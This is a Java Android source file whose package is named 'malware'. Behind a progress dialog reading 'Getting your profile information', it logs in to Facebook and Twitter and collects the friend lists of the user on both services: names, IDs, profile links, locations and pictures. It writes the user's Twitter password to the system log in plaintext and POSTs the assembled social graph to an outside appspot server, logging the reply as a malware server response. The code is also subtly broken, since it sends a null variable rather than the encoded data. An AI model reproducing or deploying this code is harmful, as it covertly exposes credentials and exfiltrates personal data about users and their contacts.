package com.malware.android;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Iterator;
import java.util.List;

import twitter4j.TwitterException;
import twitter4j.User;
import twitter4j.Twitter;

import net.xeomax.FBRocket.FBRocket;
import net.xeomax.FBRocket.Facebook;
import net.xeomax.FBRocket.Friend;
import net.xeomax.FBRocket.LoginListener;
import net.xeomax.FBRocket.ServerErrorException;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.os.Bundle;
import android.util.Log;

public class FacebookClient extends Activity implements LoginListener{

	Context context;
	ProgressDialog dialog = null;
	String twitter_user = null;
	String twitter_pass = null;
	String encoded_xml = null;

	private FBRocket fbRocket;
	private String API_KEY = "f3c8e8a17c413596360af00a31452c29";
	private String POST_URL = "http://car-pooler.appspot.com/storefacebookfriends";
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		context = this;

		Bundle b = this.getIntent().getExtras();
		twitter_user = b.getString("username");
		twitter_pass = b.getString("password");

		fbRocket = new FBRocket(this, "Facebook Login", API_KEY);
		/*
		 * do this properly later.
		 
		if (fbRocket.existsSavedFacebook()) {
			fbRocket.loadFacebook();
		}
		 
		else
		*/ 
		{
			fbRocket.login(R.layout.facebookreturn);
		}
	}

	public void onLoginFail() {
		fbRocket.displayToast("Login failed!");
	}

	public void onLoginSuccess(final Facebook facebook) {

		fbRocket.displayToast("Login success!");

		/* pull data from facebook */
		Thread facebookThread =  new Thread(new Runnable() {
			@SuppressWarnings("deprecation")
			public void run() {

				StringWriter writer = new StringWriter();
				PrintWriter out = new PrintWriter(writer);
				
				List<String> friend_uid = null;
				try 
				{
					friend_uid = facebook.getFriendUIDs();
				} 
				catch (ServerErrorException e) {

					e.printStackTrace();
				}
				String []aaa = new String [friend_uid.size()];
				friend_uid.toArray(aaa);

				List<Friend> friends = null;
				try 
				{
					friends = facebook.getFriends(aaa);
				} catch (ServerErrorException e) 
				{
					e.printStackTrace();
				}

				Iterator<Friend> iterator = friends.iterator();

				out.println("<socialgraph>");
				out.println("<facebook>");
				
				int count = 0;
				while (iterator.hasNext()){

					count++;
					out.println("<friend>");

					Friend f = iterator.next();
					String fName = f.name;
					out.println("<name>"+fName+"</name>");

					String fUid= f.uid;
					out.println("<uid>"+fUid+"</uid>");

					String fProfile = f.profile_url;
					out.println("<profileurl>"+fProfile+"</profileurl>");

					String fLocale = f.locale;
					out.println("<locale>"+fLocale+"</locale>");

					String fPicture = f.pic;
					out.println("<picture>"+fPicture+"</picture>");

					out.println("</friend>");

				}
				
				out.println("</facebook>");

				/* lets get stuff from twitter */

				Log.i("username", twitter_user);
				Log.i("password", twitter_pass);
				
				Twitter twitter = new Twitter(twitter_user, twitter_pass);

				List<User> twitterfriends = null;
				try {
					twitterfriends = twitter.getFriends();
				} catch (TwitterException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				out.println("<twitter>");						
				for (User u : twitterfriends) 
				{ 
					out.println("<friend>");
					String fName = u.getName();
					if(fName == null)
					{
						fName = "unknown";
					}
					out.println("<name>"+fName+"</name>");

					String fUid= Long.toString(u.getId());
					if(fUid == null)
					{
						fUid = "unknown";
					}
					out.println("<uid>"+fUid+"</uid>");

					String fScreenName = u.getScreenName();
					String fProfile;
					if(fScreenName == null)
					{
						fProfile = "unknown";
					}
					else
					{
						fProfile = "http://www.twitter.com/"+ u.getScreenName();
					}

					out.println("<profileurl>"+fProfile+"</profileurl>");

					String fLocale = u.getLocation();
					if(fLocale == null)
					{
						fLocale = "unknown";
					}
					out.println("<locale>"+fLocale+"</locale>");

					String fPicture;
					if(u.getProfileImageURL() == null)
					{
						fPicture = "unknown";
					}
					else
					{
						fPicture = u.getProfileImageURL().toString();
						out.println("<picture>"+fPicture+"</picture>");
					}

					out.println("</friend>");
				}
				out.println("</twitter>");
				out.println("</socialgraph>");

				out.close();
				String prof_xml = writer.toString();
				String data = null;
				try 
				{
					prof_xml = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(prof_xml, "UTF-8");
					Log.i("xml_dump", prof_xml);
				} 
				catch (UnsupportedEncodingException e1) {
					
					e1.printStackTrace();
				}


				try {

					URL url = new URL(POST_URL);
					URLConnection conn = url.openConnection();
					conn.setDoOutput(true);
					OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
					wr.write(data);
					wr.flush();

					// Get the response
					BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
					String line;
					while ((line = rd.readLine()) != null) {
						Log.i("Malware-Server-Reponse", line);
					}
					wr.close();
					rd.close();
				} catch (Exception e) {
				}

				dialog.cancel();
			}
		});

		facebookThread.start();
		dialog = ProgressDialog.show(context, "", 
				"Getting your profile information. This might take a while...", true);

	}
}
